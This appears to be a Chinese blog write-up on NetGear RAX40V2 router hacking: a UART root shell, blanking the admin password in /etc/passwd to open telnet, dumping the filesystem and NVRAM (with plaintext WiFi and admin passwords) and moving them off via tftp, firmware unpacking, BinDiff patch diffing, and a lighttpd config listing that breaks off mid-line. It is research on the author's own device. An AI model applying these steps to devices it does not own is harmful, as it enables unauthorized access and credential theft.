<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715152841551.png" alt="image-20210715152841551"></p>
<p>并且我使用google 搜索 NetGear  有没有历史的telnet 口令，在一个论坛中看到了一些信息，但是也依旧没有任何效果。</p>
<p><a target="_blank" rel="noopener" href="https://openwrt.org/toh/netgear/telnet.console">https://openwrt.org/toh/netgear/telnet.console</a></p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715164537309.png" alt="image-20210715164537309"></p>
<p>于是我打算通过UART提供的调试接口直接修改passwd 文件，因为是root 的权限，因此直接更改admin 用户的密码为空。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># cat /etc/passwd </span><br><span class="line">nobody:$1$hFVKPORB$llSaVGwuSWo.CTxU5.Qk30:0:0:nobody:/:/bin/sh</span><br><span class="line">admin:x:0:0:admin:/:/bin/sh</span><br><span class="line"># chmod 777 /etc/passwd </span><br><span class="line"># vi /etc/passwd </span><br><span class="line"># /usr/sbin/utelnetd </span><br><span class="line">telnetd: starting</span><br><span class="line">  port: 23; interface: any; login program: /bin/login</span><br></pre></td></tr></table></figure>

<p>更改为如下图所示</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210722173201973.png" alt="image-20210722173201973"></p>
<p>然后重新启动utelnetd 服务，使用telnet 连接在输入用户名admin 之后就可以直接获取到shell 。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715164004220.png" alt="image-20210715164004220"></p>
<h3 id="0x05-固件提取"><a href="#0x05-固件提取" class="headerlink" title="0x05 固件提取"></a>0x05 固件提取</h3><p>由于这款设备的是NetGear 的产品，设备固件都是可以直接下载来的，对这部分不感兴趣的直接跳过。</p>
<p>接下来开始提取设备内部的文件系统，根据前面的查看设备启动时的系统信息，并且配合设备内部的mtd信息分别，确定设备的文件系统是mtd11</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210712160130811.png" alt="image-20210712160130811"></p>
<p>使用dd 命令进行提取，在提取之前要确定空间使用的情况，以免文件太大，文件夹中放不下，如果文件太大，可以考虑将bin 文件进行压缩一下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/mtd11 of=/tmp/rootfs_ubifs.bin</span><br></pre></td></tr></table></figure>

<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723165441822.png" alt="image-20210723165441822"></p>
<p>由于设备内有 tftp ，尝试使用tftp 来进行提取dd 转储的bin 文件，但是遗憾的是，tftp 上传文件到本地tftpd server 的文件是设备内部的配置信息。其他的命令也无法正常将文件提取到设备外部。所幸文件系统内部有可以使用的wget 命令，直接上传上传一个对应架构的完整版busybox 到其中，使用完整版的tftp 将文件传出来即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -p -t -f rootfs_ubifs.bin 172.15.0.2</span><br></pre></td></tr></table></figure>

<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210722173407911.png" alt="image-20210722173407911"></p>
<p>再接下来我们提取设备的非易失性存储器NVRAM（断电之后，所存储的数据不丢失的随机访问存储器）。先将nvram的信息保存，然后使用buybox 的ftp 上传到本地中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># nvram show &gt; nvram.bin</span><br><span class="line"># strings nvram.bin &gt; nvram.html</span><br></pre></td></tr></table></figure>

<p>成功提取，这里的 WiFi密码和web 管理界面的口令都没有加密，但是路由器忘记密码更改密码的答案给加密了。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723093604176.png" alt="image-20210723093604176"></p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210723091921560.png" alt="image-20210723091921560"></p>
<h3 id="0x06-固件解包"><a href="#0x06-固件解包" class="headerlink" title="0x06 固件解包"></a>0x06 固件解包</h3><p>上面讲述了如何提取设备的固件，但是NetGear 设备固件是开放了，直接去NetGear 官网下载即可。</p>
<p>下载完成之后，这是一个用 .chk 拓展名为结尾的NetGear 固件镜像，那么使用binwalk 查看一下固件包</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715144246743.png" alt="image-20210715144246743"></p>
<p>使用binwalk -Me 解开固件包,解开固件包之后,可以看到有两个东西, 3A.ubi 文件和 ubifs-root 文件夹, 本以为固件中的文件系统提取到了ubifs-root 中，可以 ubifs-root 文件内没有任何东西。把关注点放在3A.ubi 文件上。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715144527110.png" alt="image-20210715144527110"></p>
<p>解开ubi 文件有两种方法,一个是通过挂载的方式, 一个是使用 ubi_reader 套件来解开，挂载的话过于麻烦，这里使用 ubi_reader 套件来解开. 我们需要<a target="_blank" rel="noopener" href="https://github.com/jrspruitt/ubi_reader%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87PIP%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85%EF%BC%9A%60sudo">https://github.com/jrspruitt/ubi_reader，可以通过PIP进行安装：`sudo</a> pip install ubi_reader&#96;， 使用 ubireader_extract_images 来进行解开ubi 的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubireader_extract_images 3A.ubi</span><br></pre></td></tr></table></figure>

<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715144847678.png" alt="image-20210715144847678"></p>
<p>解开之后 ubifs-root 文件内会生成四个ubifs 的文件 </p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715145136101.png" alt="image-20210715145136101"></p>
<p>根据前面对设备启动时的系统信息分析，rootfs_ubifs.ubifs 就是固件的文件系统。</p>
<p>使用binwalk 进行分析, 识别出来是squashfs 文件系统, 看样子是可以使用binwalk 解开固件</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715145448407.png" alt="image-20210715145448407"></p>
<p>成功解开 </p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715145609962.png" alt="image-20210715145609962"></p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715145623616.png" alt="image-20210715145623616"></p>
<h2 id="RAX40"><a href="#RAX40" class="headerlink" title="RAX40"></a>RAX40</h2><h3 id="公开的漏洞信息"><a href="#公开的漏洞信息" class="headerlink" title="公开的漏洞信息"></a>公开的漏洞信息</h3><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210715141700044.png" alt="image-20210715141700044"></p>
<p>1 day 发现，漏洞挖掘方法</p>
<p>通过固件比对的方式来进行固件分析</p>
<p><a target="_blank" rel="noopener" href="https://pup2y.github.io/2020/09/18/2020-qiang-wang-bei-jue-sai-cisco-lu-you-qi/">https://pup2y.github.io/2020/09/18/2020-qiang-wang-bei-jue-sai-cisco-lu-you-qi/</a></p>
<p>通过bindiff 对两个版本程序进行对比，从而对漏洞进行定位</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/200087">https://www.anquanke.com/post/id/200087</a></p>
<h3 id="安装bindiff-工具"><a href="#安装bindiff-工具" class="headerlink" title="安装bindiff 工具"></a>安装bindiff 工具</h3><p>（一） 、首先去官方下载，需要翻墙</p>
<p><a target="_blank" rel="noopener" href="https://www.zynamics.com/software.html">https://www.zynamics.com/software.html</a></p>
<p>window 10 可以下载</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718190554095.png" alt="image-20210718190554095"></p>
<p>（二）、安装就好了，唯一要注意的是在自定义安装路径的时候，选在IDA的路径就好，我的安装路径是 （D:&#x2F;&#x2F;IDApro75&#x2F;IDApro75&#x2F;）</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718190800881.png" alt="image-20210718190800881"></p>
<h3 id="如何使用bindiff"><a href="#如何使用bindiff" class="headerlink" title="如何使用bindiff"></a>如何使用bindiff</h3><p>（一）、用IDA 打开你要对比分析的两个二进制程序，然后保存为   .ida （.ida64） 的格式。（注意：二进制程序保存的路径一定要是纯英文路径，不然会显示 “Error while diffing: Export of the secondary database failed: File not found”）。</p>
<p>（二）、打开一个二进制程序，然后快捷键Ctrl + 6 ，打开BinDiff，点击”Diff Database…”，选择将要进行对比分析的另一个二进制程序，加载进来就好。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718191915610.png" alt="image-20210718191915610"></p>
<p>（三）最终的界面如下图所示，增加了四个栏目</p>
<p>Prinary Umatched： 主文件没有匹配的函数</p>
<p>Secondary Unmatched : 对比文件中没有匹配的函数</p>
<p>Matched Functions : 表示两个文件的相似度，相似度从高到低排，相似度为 1 ,则表示两个文件高度相似的函数，值越低，说明改动越大。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718193341721.png" alt="image-20210718193341721"></p>
<p>然后使用bindiff.exe  创建workspce , 打开文件</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210719154927704.png" alt="image-20210719154927704"></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718201355407.png" alt="image-20210718201355407"></p>
<p>进入这个函数</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718201444032.png" alt="image-20210718201444032"></p>
<p>结合 lighttpd5.conf 文件中的命令，可以推断出lighttpd的配置文件的路径。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718201541967.png" alt="image-20210718201541967"></p>
<p>查看 lighttpd5.conf 调用的地方，显示在 &#x2F;etc&#x2F;init.d&#x2F;lighttpd5 中调用，结合上面的命令，可以知道系统在启动的时候，会启动 lighttpd 的服务。</p>
<p><img src="/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20210718202116746.png" alt="image-20210718202116746"></p>
<h2 id="lighttpd-相关学习"><a href="#lighttpd-相关学习" class="headerlink" title="lighttpd 相关学习"></a>lighttpd 相关学习</h2><p>根据RAX40 lighttpd 的逆向，了解到lighttpd 的版本为1.4.47 </p>
<p><a target="_blank" rel="noopener" href="https://git.lighttpd.net/lighttpd/lighttpd1.4/src/tag/lighttpd-1.4.47">https://git.lighttpd.net/lighttpd/lighttpd1.4/src/tag/lighttpd-1.4.47</a></p>
<h3 id="主要的配置文件-lighttpd-conf"><a href="#主要的配置文件-lighttpd-conf" class="headerlink" title="主要的配置文件 lighttpd.conf"></a>主要的配置文件 lighttpd.conf</h3><p>下面的文件来自于RAX40 固件中的配置文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><span class="line"># lighttpd configuration file</span><br><span class="line">#</span><br><span class="line">## modules to load</span><br><span class="line"># all other module should only be loaded if really neccesary</span><br><span class="line"># - saves some time</span><br><span class="line"># - saves memory</span><br><span class="line"># 选择需要用到的模块</span><br><span class="line">server.modules = (</span><br><span class="line">#	&quot;mod_rewrite&quot;,</span><br><span class="line">#	&quot;mod_redirect&quot;,</span><br><span class="line">	&quot;mod_alias&quot;,</span><br><span class="line">	&quot;mod_auth&quot;,</span><br><span class="line">#	&quot;mod_status&quot;,</span><br><span class="line">	&quot;mod_setenv&quot;,</span><br><span class="line">#	&quot;mod_fastcgi&quot;,</span><br><span class="line">#	&quot;mod_proxy&quot;,</span><br><span class="line">#	&quot;mod_simple_vhost&quot;,</span><br><span class="line">	&quot;mod_cgi&quot;,</span><br><span class="line">#	&quot;mod_ssi&quot;,</span><br><span class="line">	&quot;mod_usertrack&quot;,</span><br><span class="line">#	&quot;mod_expire&quot;,</span><br><span class="line">	&quot;mod_compress&quot;,</span><br><span class="line">#	&quot;mod_webdav&quot;,</span><br><span class="line">	&quot;mod_openssl&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">include &quot;vendor_path.conf&quot;</span><br><span class="line"></span><br><span class="line"># force use of the &quot;write&quot; backend (closes: #2401)</span><br><span class="line">server.network-backend = &quot;write&quot;</span><br><span class="line"></span><br><span class="line">## a static document-root, for virtual-hosting take look at the </span><br><span class="line">## server.virtual-* options</span><br><span class="line"># 修改网站根目录路径</span><br><span class="line">server.document-root = var.VendorPath+&quot;/www/&quot;</span><br><span class="line"></span><br><span class="line">alias.url += ( &quot;/cgi-bin/&quot; =&gt; &quot;/www/cgi-bin/&quot; )</span><br><span class="line">alias.url += ( &quot;/luci-static/&quot; =&gt; &quot;/www/luci-static/&quot; )</span><br><span class="line"></span><br><span class="line">## where to send error-messages to</span><br><span class="line"># 设置错误日志文件路劲</span><br><span class="line">#server.errorlog = &quot;/var/log/lighttpd/error.log&quot;</span><br><span class="line"></span><br><span class="line">## files to check for if .../ is requested</span><br><span class="line">index-file.names = ( &quot;index.html&quot;, &quot;default.html&quot;, &quot;index.htm&quot;, &quot;default.htm&quot; )</span><br><span class="line"></span><br><span class="line">## mimetype mapping</span><br><span class="line">mimetype.assign = (</span><br><span class="line">	&quot;.pdf&quot;   =&gt; &quot;application/pdf&quot;,</span><br><span class="line">	&quot;.class&quot; =&gt; &quot;application/octet-stream&quot;,</span><br><span class="line">	&quot;.pac&quot;   =&gt; &quot;application/x-ns-proxy-autoconfig&quot;,</span><br><span class="line">	&quot;.swf&quot;   =&gt; &quot;application/x-shockwave-flash&quot;,</span><br><span class="line">	&quot;.json&quot;   =&gt; &quot;application/json&quot;,</span><br><span class="line">	&quot;.wav&quot;   =&gt; &quot;audio/x-wav&quot;,</span><br><span class="line">	&quot;.gif&quot;   =&gt; &quot;image/gif&quot;,</span><br><span class="line">	&quot;.jpg&quot;   =&gt; &quot;image/jpeg&quot;,</span><br><span class="line">	&quot;.jpeg&quot;  =&gt; &quot;image/jpeg&quot;,</span><br><span class="line">	&quot;.png&quot;   =&gt; &quot;image/png&quot;,</span><br><span class="line">	&quot;.svg&quot;   =&gt; &quot;image/svg+xml&quot;,</span><br><span class="line">	&quot;.css&quot;   =&gt; &quot;text/css;charset=UTF-8&quot;,</span><br><span class="line">	&quot;.html&quot;  =&gt; &quot;text/html;charset=UTF-8&quot;,</span><br><span class="line">	&quot;.htm&quot;   =&gt; &quot;text/html;charset=UTF-8&quot;,</span><br><span class="line">	&quot;.js&quot;    =&gt; &quot;text/javascript;charset=UTF-8&quot;,</span><br><span class="line">	&quot;.txt&quot;   =&gt; &quot;text/plain;charset=UTF-8&quot;,</span><br><span class="line">	&quot;.dtd&quot;   =&gt; &quot;text/xml;charset=UTF-8&quot;,</span><br><span class="line">	&quot;.xml&quot;   =&gt; &quot;text/xml;charset=UTF-8&quot;</span><br><span class="line"> )</span><br><span class="line"></span><br><span class="line">## Use the &quot;Content-Type&quot; extended attribute to obtain mime type if possible</span><br><span class="line">#mimetypes.use-xattr = &quot;enable&quot;</span><br><span class="line"></span><br><span class="line">## send a different Server: header</span><br><span class="line">server.tag = &quot;Unknown-Webserver/1.0&quot;</span><br><span class="line"></span><br><span class="line">$HTTP[&quot;url&quot;] =~ &quot;\.pdf$&quot; &#123;</span><br><span class="line">	server.range-requests = &quot;disable&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># which extensions should not be handle via static-file transfer</span><br><span class="line"># 这些文件后缀不能通过静态文件来处理</span><br><span class="line"># .php, .pl, .fcgi are most often handled by mod_fastcgi or mod_cgi</span><br><span class="line">static-file.exclude-extensions = ( &quot;.php&quot;, &quot;.pl&quot;, &quot;.fcgi&quot; )</span><br><span class="line"></span><br><span class="line">######### Options that are good to be but not neccesary to be changed #######</span><br><span class="line"></span><br><span class="line">## bind to port (default: 80)</span><br><span class="line"></span><br><span class="line">server.port = 18080</span><br><span class="line"></span><br><span class="line">## bind to localhost (default: all interfaces)</span><br><span class="line">#server.bind = &quot;localhost&quot;</span><br><span class="line"></span><br><span class="line">## Enable Ipv6 </span><br><span class="line">server.bind = &quot;[::]&quot;</span><br><span class="line">server.set-v6only = &quot;disable&quot;</span><br><span class="line"></span><br><span class="line">## error-handler for status 404</span><br><span class="line">#server.error-handler-404 = &quot;/error-handler.php&quot;</span><br><span class="line"></span><br><span class="line">## to help the rc.scripts</span><br><span class="line">server.pid-file = &quot;/var/run/lighttpd.pid&quot;</span><br><span class="line"></span><br><span class="line">#cgi-bin</span><br><span class="line">$HTTP[&quot;remoteip&quot;] =~ &quot;127.0.0.1&quot; &#123;</span><br><span class="line">        alias.url += (</span><br><span class="line">                &quot;/doc/&quot; =&gt; &quot;/usr/share/doc/&quot;,</span><br><span class="line">                &quot;/images/&quot; =&gt; &quot;/usr/share/images/&quot;</span><br><span class="line">        )</span><br><span class="line">        $HTTP[&quot;url&quot;] =~ &quot;^/doc/|^/images/&quot; &#123;</span><br><span class="line">                dir-listing.activate = &quot;enable&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        $HTTP[&quot;url&quot;] =~ &quot;/cgi-bin/&quot; &#123;</span><br><span class="line">                cgi.assign = ( &quot;&quot; =&gt; &quot;&quot; )</span><br><span class="line">        &#125;</span><br><span class="line">        cgi.assign      = (</span><br><span class="line">                &quot;.cgi&quot;  =&gt; &quot;&quot;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$HTTP[&quot;url&quot;] =~ &quot;^/cgi-bin/&quot; &#123;</span><br><span class="line">        cgi.assign = ( &quot;&quot; =&gt; &quot;&quot; )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$HTTP[&quot;url&quot;] =~ &quot;^/cgi/&quot; &#123;</span><br><span class="line">        cgi.assign = ( &quot;&quot; =&gt; &quot;&quot; )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 